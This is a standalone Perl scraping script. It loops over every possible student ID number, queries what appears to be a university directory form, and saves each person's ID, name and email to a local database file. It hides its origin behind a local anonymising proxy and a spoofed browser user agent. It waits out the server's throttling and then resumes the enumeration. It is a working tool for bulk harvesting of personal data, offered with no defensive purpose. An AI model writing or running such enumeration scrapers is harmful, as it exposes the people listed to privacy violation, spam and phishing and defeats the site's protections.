#use LWP::Debug qw(+);
use HTTP::Request::Common;
use LWP::UserAgent;
use strict;

my $ua=LWP::UserAgent->new();
$ua->agent("Mozilla/6.0 (compatible; MSIE 5.54; Mac_PowerPC)");

$ua->proxy('http', 'http://127.0.0.1:8118');

my $matricola;
my $indice=0;
my $f=1;
my $temp;
my $uno="Matricola";
my $due="Nome e Cognome";
my $tre="Indirizzo di posta";
my @splittore;
my $m;
my $n;
my $e;
my $cont;

for ($matricola=0000; $matricola<=99999999; $matricola++)
{                
        my $req = POST 'LULZ',
                [ cognome   => '', esatto  => 'esatto', nome => '', matricola => $matricola];

        my $res = $ua->request($req);
        if ($res->is_success)
        {                
                my $resp = $res->content;                
                while($resp =~ m/ALIGN\=center\>([^<]+)\<\/strong\>\<\/body\>/g)
                {
                        print "\n$1\n";
                        $f=0;
                }
				while($resp=~ m/\<br\>\<b\>([^<]+)\<\/b\>/g)
				{
					$cont=$1;
					$cont=~ s/\&agrave;/a\'/g;
					$cont=~ s/\&uacute;/u\'/g;
					
					print "\n$cont\nPausa 3 minuti\n";
					$f=0;
					sleep(180);
					$matricola--;
				}
                if ($f!=0)
                {						
						open DBC, ">>C:/Project/LOL/db_unimi.txt";       
						
                        while($resp =~ m/\<TD class\=txtb\>([^<]+)\<\/TD\>/g)
                        {
                                print "\n$1\n";
                                $m=$1;
                                chomp($m);
                        }
                        while($resp =~ m/\<td class\=txtb\>([^<]+)\<\/td\>/g)
                        {
                                $temp=$1;
                                if (($temp eq $uno)||($temp eq $due)||($temp eq $tre))
                                {
                                print "\n";
                                }
                                else
                                {
                                        if ($indice==0)
                                        {
                                                $temp=~ s/ +/ /g;
                                                chomp($temp);
                                                print "$temp\t\t";
                                                $n=$temp;
                                                $indice=1;
                                        }
                                        else
                                        {
                                                print "$1\n\n";
                                                $e=$1;
                                                chomp($e);
                                        }
                                }
                        }
						print DBC "('$m','$n','$e'),";				
						close DBC; 
                }
        }
        else
        {
                open DBD, ">>C:/Project/LOL/persi.txt";
                print $res->status_line, "\n";
                print DBD "$matricola\n";
                close DBD;
        }
        $indice=0;
        $f=1;              	
}
